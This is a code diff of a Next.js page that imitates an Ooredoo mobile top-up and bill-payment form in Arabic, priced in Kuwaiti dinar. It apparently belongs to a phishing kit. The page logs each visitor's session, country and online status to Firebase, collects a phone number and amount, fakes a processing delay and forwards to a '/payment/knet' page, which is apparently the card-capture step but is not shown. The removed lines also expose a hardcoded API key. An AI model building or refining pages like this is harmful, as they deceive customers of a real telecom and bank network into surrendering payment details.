@@ -1,206 +1,300 @@
 "use client"
 
-import { useEffect, useState } from "react"
+import type React from "react"
+
+import { useEffect, useState, useCallback } from "react"
 import { useRouter } from "next/navigation"
-import { addData } from "@/lib/firebase"
-import { setupOnlineStatus } from "@/lib/utils"
-import { ArrowLeft, Receipt } from "lucide-react"
+import { ArrowLeft, Receipt, Loader2, Trash2 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
+import { Card, CardContent } from "@/components/ui/card"
+import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
 
-export default function Page() {
+interface PaymentData {
+  id: string
+  phone?: string
+  country?: string
+  amount?: string
+}
+
+interface LocationResponse {
+  country_name: string
+}
+
+export default function PaymentPage() {
   const router = useRouter()
-  const [value, setValue] = useState("5")
-  const [phone, setPhone] = useState("")
-  const [isloading, setIsloading] = useState(false)
-  const _id = randstr("oredoo-")
+  const [amount, setAmount] = useState("5.0")
+  const [phoneNumber, setPhoneNumber] = useState("")
+  const [isLoading, setIsLoading] = useState(false)
+  const [isInitializing, setIsInitializing] = useState(true)
 
-  function randstr(prefix: string) {
-    return Math.random()
-      .toString(36)
-      .replace("0.", prefix || "")
-  }
+  const generateId = useCallback((prefix = "ooredoo-"): string => {
+    return `${prefix}${Math.random().toString(36).substring(2, 15)}`
+  }, [])
 
-  async function getLocation() {
-    const APIKEY = "a48dbc44c94452a8427c73683e68294f00a2892eee042a563ee1d07b"
-    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+  const formatAmount = useCallback((value: string): string => {
+    const numericValue = Number.parseFloat(value.replace(/[^\d.]/g, ""))
+    return isNaN(numericValue) ? "0.0" : numericValue.toFixed(1)
+  }, [])
+
+  const validatePhoneNumber = useCallback((phone: string): boolean => {
+    const phoneRegex = /^[0-9]{8}$/
+    return phoneRegex.test(phone)
+  }, [])
+
+  const getLocationData = useCallback(async (): Promise<string | null> => {
+    try {
+      // In production, this should be handled server-side to protect the API key
+      const response = await fetch("/api/location")
+
+      if (!response.ok) {
+        throw new Error(`Failed to fetch location: ${response.status}`)
+      }
+
+      const data: LocationResponse = await response.json()
+      return data.country_name
+    } catch (error) {
+      console.error("Location detection failed:", error)
+     
+      return null
+    }
+  }, [])
+
+  const initializeSession = useCallback(async () => {
+    try {
+      setIsInitializing(true)
+      const sessionId = generateId()
+      const country = await getLocationData()
+
+      const sessionData: PaymentData = {
+        id: sessionId,
+        ...(country && { country }),
+      }
+
+      await addData(sessionData)
+      localStorage.setItem("sessionId", sessionId)
+      if (country) {
+        localStorage.setItem("country", country)
+      }
+
+      setupOnlineStatus(sessionId)
+    } catch (error) {
+      console.error("Session initialization failed:", error)
+     
+    } finally {
+      setIsInitializing(false)
+    }
+  }, [generateId, getLocationData])
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+
+    if (!validatePhoneNumber(phoneNumber)) {
+     
+      return
+    }
+
+    const numericAmount = Number.parseFloat(amount.replace(/[^\d.]/g, ""))
+    if (numericAmount < 1 || numericAmount > 100) {
+    
+      return
+    }
+
+    setIsLoading(true)
 
     try {
-      const response = await fetch(url)
-      if (!response.ok) {
-        throw new Error(`HTTP error! Status: ${response.status}`)
+      const sessionId = localStorage.getItem("sessionId")
+      if (!sessionId) {
+        throw new Error("Session not found")
       }
-      const country = await response.text()
-      addData({
-        id: _id,
-        country: country,
-      })
-      localStorage.setItem("country", country)
 
-      setupOnlineStatus(_id)
-      return country
+      const paymentData: PaymentData = {
+        id: sessionId,
+        phone: phoneNumber,
+        amount: amount,
+      }
+
+      await addData(paymentData)
+      localStorage.setItem("paymentAmount", amount)
+
+     
+
+      // Simulate processing time
+      await new Promise((resolve) => setTimeout(resolve, 1500))
+      router.push("/payment/knet")
     } catch (error) {
-      console.error("Error fetching location:", error)
+      console.error("Payment submission failed:", error)
+    
+    } finally {
+      setIsLoading(false)
     }
   }
 
-  useEffect(() => {
-    async function checkCountry() {
-      try {
-        // Get the country code
-        await getLocation().then((v) => {})
+  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/[^\d.]/g, "")
+    setAmount(formatAmount(value))
+  }
 
-        setIsloading(false)
-      } catch (error) {
-        console.error("Error in country detection:", error)
-        setIsloading(false)
-      }
-    }
+  const clearAmount = () => {
+    setAmount("0.000")
+  }
 
-    checkCountry()
-  }, [router])
-
-  const handleSubmit = (e: any) => {
-    e.preventDefault()
-    setIsloading(true)
-    const _id = localStorage.getItem("visitor")
-
-    addData({ id: _id, phone })
-    setTimeout(() => {
-      setIsloading(false)
-      router.push("/knet")
-    }, 1000)
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/[^\d]/g, "").slice(0, 8)
+    setPhoneNumber(value)
   }
 
   useEffect(() => {
-    localStorage.setItem("total", value)
-  }, [value])
+    initializeSession()
+  }, [initializeSession])
+
+  useEffect(() => {
+    localStorage.setItem("paymentAmount", amount)
+  }, [amount])
+
+  if (isInitializing) {
+    return (
+      <div className="flex items-center justify-center min-h-screen bg-gray-50">
+        <div className="text-center">
+          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-red-500" />
+          <p className="text-gray-600">جاري التحميل...</p>
+        </div>
+      </div>
+    )
+  }
 
   return (
-    <div className="flex flex-col min-h-screen bg-white">
-      <header className="flex justify-between items-center p-4 sticky top-0 z-50">
-        <div className="flex items-center gap-2">
-          <div className="flex items-center border border-gray-300 rounded-full px-3 py-1">
-            <span className="text-sm font-medium">English</span>
-            <span className="mx-2 text-gray-400">|</span>
-            <span className="text-sm font-bold text-black">دفع</span>
+    <div className="flex flex-col min-h-screen bg-gray-50">
+      {/* Header */}
+      <header className="bg-white shadow-sm sticky top-0 z-50">
+        <div className="flex justify-between items-center p-4">
+          <div className="flex items-center">
+            <div className="flex items-center border border-gray-300 rounded-full px-4 py-2 bg-gray-50">
+              <span className="text-sm font-medium text-gray-600">English</span>
+              <span className="mx-2 text-gray-300">|</span>
+              <span className="text-sm font-bold text-gray-900">عربي</span>
+            </div>
           </div>
+          <Button
+            variant="ghost"
+            size="sm"
+            onClick={() => router.back()}
+            className="p-2 hover:bg-gray-100 rounded-full"
+          >
+            <ArrowLeft className="w-5 h-5" />
+          </Button>
         </div>
-        <button className="p-2 flex items-center" onClick={() => router.back()}>
-          <ArrowLeft className="w-5 h-5" />
-        </button>
       </header>
 
-      <div className="w-full px-4 py-2">
-        <div className="relative w-full overflow-hidden rounded-xl mb-6">
-          <img
-            src="/zf.png"
-            alt="Smart Pay Promotion"
-            className="w-full h-auto object-cover rounded-xl"
-          />
-        </div>
-
-        <form className="w-full" onSubmit={handleSubmit}>
-          <div className="flex justify-between mb-2">
-            <div className="text-xl font-bold">رقم الموبايل</div>
-            <div className="text-xl font-bold">المبلغ</div>
+      <main className="flex-1 p-4 space-y-6">
+        {/* Promotional Banner */}
+        <Card className="overflow-hidden">
+          <div className="relative">
+            <img
+              src="/zf.png"
+              alt="عرض الدفع الذكي"
+              className="w-full h-48 object-cover"
+            />
+            <div className="absolute inset-0 " />
           </div>
+        </Card>
 
-          <div className="flex gap-3 mb-4">
-            <div className="flex-1">
-              <Input
-                type="tel"
-                maxLength={10}
-                className="text-right py-6 border-gray-300 rounded-lg text-lg"
-                placeholder=""
-                value={phone}
-                required
-                onChange={(e) => setPhone(e.target.value)}
-                dir="rtl"
-              />
-            </div>
-            <div className="relative w-32">
-              <Input
-                type="tel"
-                className="text-center py-6 text-lg font-medium border-gray-300 rounded-lg"
-                value={value}
-                maxLength={4}
-                onChange={(e) => setValue(e.target.value)}
-                dir="rtl"
-              />
-              <div className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 font-medium">د.ك</div>
-              <button type="button" className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500">
-                <svg
-                  xmlns="http://www.w3.org/2000/svg"
-                  width="24"
-                  height="24"
-                  viewBox="0 0 24 24"
-                  fill="none"
-                  stroke="currentColor"
-                  strokeWidth="2"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                  className="lucide lucide-trash-2"
-                >
-                  <path d="M3 6h18" />
-                  <path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6" />
-                  <path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2" />
-                  <line x1="10" x2="10" y1="11" y2="17" />
-                  <line x1="14" x2="14" y1="11" y2="17" />
-                </svg>
-              </button>
-            </div>
-          </div>
+        {/* Payment Form */}
+        <Card>
+          <CardContent className="p-6">
+            <form onSubmit={handleSubmit} className="space-y-6">
+              {/* Form Headers */}
+              <div className="flex justify-between items-center">
+                <h2 className="text-xl font-bold text-gray-900">رقم الموبايل</h2>
+                <h2 className="text-xl font-bold text-gray-900">المبلغ</h2>
+              </div>
 
-          <Button
-            type="button"
-            className="w-full py-6 mb-8 bg-white text-red-500 border border-red-500 rounded-full text-lg font-medium"
-          >
-            الدفع لرقم آخر
-          </Button>
+              {/* Input Fields */}
+              <div className="flex gap-4">
+                <div className="flex-1">
+                  <Input
+                    type="tel"
+                    value={phoneNumber}
+                    onChange={handlePhoneChange}
+                    placeholder="60012345"
+                    className="text-right py-4 text-lg border-gray-300 focus:border-red-500 focus:ring-red-500"
+                    dir="rtl"
+                    required
+                    aria-label="رقم الموبايل"
+                  />
+                  {phoneNumber && !validatePhoneNumber(phoneNumber) && (
+                    <p className="text-sm text-red-500 mt-1 text-right">يجب أن يكون الرقم مكون من 8 أرقام</p>
+                  )}
+                </div>
 
-          <div className="flex justify-between items-center mb-2 mt-8">
-            <div className="flex items-center text-gray-700">
-              <Receipt className="w-5 h-5 text-red-500 mr-2" />
-              <div className="text-lg font-medium">إعادة التعبئة / دفع الفواتير</div>
-            </div>
-          </div>
+                <div className="relative w-32">
+                  <Input
+                    type="text"
+                    value={amount}
+                    onChange={handleAmountChange}
+                    className="text-center py-4 text-lg font-medium border-gray-300 focus:border-red-500 focus:ring-red-500 pr-10 pl-12"
+                    dir="rtl"
+                    aria-label="المبلغ"
+                  />
+                  <div className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 font-medium text-sm">
+                    د.ك
+                  </div>
+                  <Button
+                    type="button"
+                    variant="ghost"
+                    size="sm"
+                    onClick={clearAmount}
+                    className="absolute right-2 top-1/2 transform -translate-y-1/2 p-1 hover:bg-gray-100 rounded"
+                  >
+                    <Trash2 className="w-4 h-4 text-gray-400" />
+                  </Button>
+                </div>
+              </div>
 
-          <div className="flex justify-between items-center mb-6">
-            <div className="text-lg font-bold">د.ك {Number.parseFloat(value).toFixed(3)}</div>
-            <div className="text-lg font-medium">الإجمالي:</div>
-          </div>
+              {/* Pay to Another Number Button */}
+              <Button
+                type="button"
+                variant="outline"
+                className="w-full py-4 border-red-500 text-red-500 hover:bg-red-50 rounded-full text-lg font-medium"
+              >
+                الدفع لرقم آخر
+              </Button>
 
-          <Button
-            type="submit"
-            className={`w-full py-6 mt-4 bg-gray-200 text-gray-500 rounded-full text-lg font-medium ${isloading ? "opacity-80 cursor-not-allowed" : ""}`}
-            disabled={isloading}
-          >
-            {isloading ? (
-              <>
-                <svg
-                  className="animate-spin -ml-1 mr-3 h-5 w-5 text-gray-500"
-                  xmlns="http://www.w3.org/2000/svg"
-                  fill="none"
-                  viewBox="0 0 24 24"
-                >
-                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                  <path
-                    className="opacity-75"
-                    fill="currentColor"
-                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                  ></path>
-                </svg>
-                <span>جاري المعالجة...</span>
-              </>
-            ) : (
-              <>
-                <span>استمرار</span>
-              </>
-            )}
-          </Button>
-        </form>
-      </div>
+              {/* Payment Summary */}
+              <div className="bg-gray-50 rounded-lg p-4 space-y-3">
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center text-gray-700">
+                    <Receipt className="w-5 h-5 text-red-500 ml-2" />
+                    <span className="text-lg font-medium">إعادة التعبئة / دفع الفواتير</span>
+                  </div>
+                </div>
+
+                <div className="flex justify-between items-center pt-2 border-t border-gray-200">
+                  <div className="text-xl font-bold text-gray-900">د.ك {formatAmount(amount)}</div>
+                  <div className="text-lg font-medium text-gray-700">الإجمالي:</div>
+                </div>
+              </div>
+
+              {/* Submit Button */}
+              <Button
+                type="submit"
+                disabled={isLoading || !phoneNumber || !validatePhoneNumber(phoneNumber)}
+                className="w-full py-4 bg-red-500 hover:bg-red-600 disabled:bg-gray-300 disabled:text-gray-500 text-white rounded-full text-lg font-medium transition-colors"
+              >
+                {isLoading ? (
+                  <div className="flex items-center justify-center">
+                    <Loader2 className="w-5 h-5 animate-spin ml-2" />
+                    <span>جاري المعالجة...</span>
+                  </div>
+                ) : (
+                  <span>استمرار</span>
+                )}
+              </Button>
+            </form>
+          </CardContent>
+        </Card>
+      </main>
     </div>
   )
 }
